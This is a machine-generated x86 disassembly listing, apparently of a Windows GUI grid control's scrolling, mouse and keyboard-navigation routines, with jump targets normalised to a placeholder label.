dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_473750
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4742b4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4743b4
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_4727b4
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_474230
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_403450
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_474230
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47405c
sub_474334
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4507d8
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_4743b4
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_450adc
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_4727b4
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_4729ec
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_474334
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_475828
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_4499bc
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_474334
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_474334
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_473b7c
jmp r-xdata
sub_474500
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_474524
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4507d8
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_474594
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_472838
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4729ec
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_47460c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_474594
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_4507d8
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_4507d8
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_474500
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_474688
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_47460c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_475828
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4499bc
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4507d8
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_47471c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_47460c
pop ecx
sub_474760
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4499bc
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_449a00
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_474524
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_474524
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_47486e
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_474688
pop ecx
mov eax [ ebp - 0x8 ]
call sub_449a00
mov [ ebp - 0x2c ] eax
push ebp
call sub_47471c
pop ecx
mov eax [ ebp - 0x8 ]
call sub_4499bc
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474875
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_4499bc
mov [ ebp - 0x5c ] eax
push ebp
call sub_474688
pop ecx
sub_474875
mov eax [ ebp - 0x8 ]
call sub_4743b4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_4742b4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_4748b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d62c
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_474934
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_4727b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_4749a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_4749e0
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_44f5cc
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_403450
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_474934
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x88 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x94 ]
push eax
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0x88 ]
mov eax [ edi ]
call sub_4729ec
mov eax [ ebp - 0x94 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x88 ]
push eax
mov eax [ ebp - 0x84 ]
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x78 ]
call sub_4749a0
mov edx [ edi ]
mov edx [ edx + 0x258 ]
mov eax [ ebp - 0x78 ]
cmp edx eax
jne r-xdata
jmp [ eax * 4 + jump_table_474a8c ]
dec [ ebp - 0x7c ]
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
cmp eax 0x22
jg r-xdata
mov ecx [ ebp - 0x74 ]
mov edx eax
mov eax [ edi ]
call sub_473f78
mov edx [ edi ]
mov edx [ edx + 0x25c ]
cmp edx [ ebp - 0x74 ]
je r-xdata
dec [ ebp - 0x74 ]
jmp r-xdata
inc [ ebp - 0x74 ]
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x25c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403450
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov si 0xffc8
call sub_403450
mov [ ebp - 0x89 ] al
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
sub [ ebp - 0x80 ] esi
jmp r-xdata
sub [ ebp - 0x7c ] esi
jmp r-xdata
sub eax 0x23
je r-xdata
je r-xdata
test [ ebp - 0x6d ] 0x1
setne dl
xor dl 0x1
push edx
mov ecx [ ebp - 0x7c ]
mov edx eax
mov eax [ edi ]
call sub_473478
mov edx [ edi ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x7c ]
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
push eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
push eax
mov eax [ edi ]
mov ecx [ eax + 0x23c ]
mov eax [ edi ]
mov edx [ eax + 0x238 ]
lea eax [ ebp - 0x80 ]
call sub_4749a0
mov edx [ edi ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x80 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x68 ]
imul esi
sub [ ebp - 0x80 ] eax
sub [ ebp - 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
imul esi
add [ ebp - 0x80 ] eax
add [ ebp - 0x78 ] eax
jmp r-xdata
add [ ebp - 0x80 ] esi
jmp r-xdata
add [ ebp - 0x7c ] esi
jmp r-xdata
inc [ ebp - 0x7c ]
jmp r-xdata
sub eax 0x49
je r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x6c ]
add [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
add [ ebp - 0x74 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x89 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ edi ]
call sub_475bb0
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
mov eax [ edi ]
test [ eax + 0x249 ] 0x10
je r-xdata
jmp r-xdata
test [ ebp - 0x6d ] 0x2
jne r-xdata
sub eax 0x18
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
jmp r-xdata
test [ ebp - 0x6d ] 0x1
je r-xdata
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x7c ] eax
mov eax [ ebp - 0x6c ]
sub [ ebp - 0x74 ] eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x21c ]
cmp eax [ ebp - 0x80 ]
jg r-xdata
dec [ ebp - 0x80 ]
mov eax [ edi ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x80 ]
jle r-xdata
mov edx [ ebp - 0x80 ]
mov eax [ edi ]
call sub_475884
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x238 ]
mov [ ebp - 0x80 ] eax
inc [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x24c ]
cmp eax [ ebp - 0x7c ]
jg r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x6d ] al
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x80 ] eax
dec [ ebp - 0x7c ]
mov eax [ edi ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0x7c ]
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0x7c ] eax
mov eax [ edi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x7c ] eax
jmp r-xdata
sub_474e4d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f784
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi ] 0xd
jne r-xdata
cmp [ ebx + 0x28d ] 0x0
je r-xdata
mov eax ebx
call sub_4716e4
mov eax ebx
call sub_4716d4
jmp r-xdata
mov [ esi ] 0x0
sub_474e8c
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_475d78
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb8
call sub_403450
test al al
jne r-xdata
test bl bl
jne r-xdata
test [ ebp - 0x5 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ ebp - 0x4 ]
call sub_471654
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_461dc8
test eax eax
jne r-xdata
xor eax eax
push ebp
push j_sub_4036f4#3
push [ fs : eax ]
mov [ fs : eax ] esp
push edi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x5 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b580
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_4727b4
mov eax [ ebp - 0x4 ]
add eax 0x28e
push eax
mov eax [ ebp - 0x4 ]
add eax 0x260
push eax
mov eax [ ebp - 0x4 ]
add eax 0x264
push eax
mov eax [ ebp - 0x4 ]
add eax 0x268
push eax
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xcc ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403450
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44a1f0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_472758
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov esi [ ebp - 0x10 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x4 ]
call sub_4731a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x249 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetTimer
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x10 ]
cmp edx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ ebp - 0xc ]
jg r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_473e20
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_473d98
jmp r-xdata
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_473e20
mov eax [ ebp - 0x4 ]
call sub_475e54
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_419174
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa2
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4716e4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ edx + 0x26c ] eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x270 ] eax
lea ecx [ ebp - 0x80 ]
mov edx [ ebp + 0x8 ]
mov eax edi
call sub_419174
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xffa3
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call SetTimer
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403450
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_4732e8
mov [ ebp - 0x11 ] 0x1
push 0x0
push 0x3c
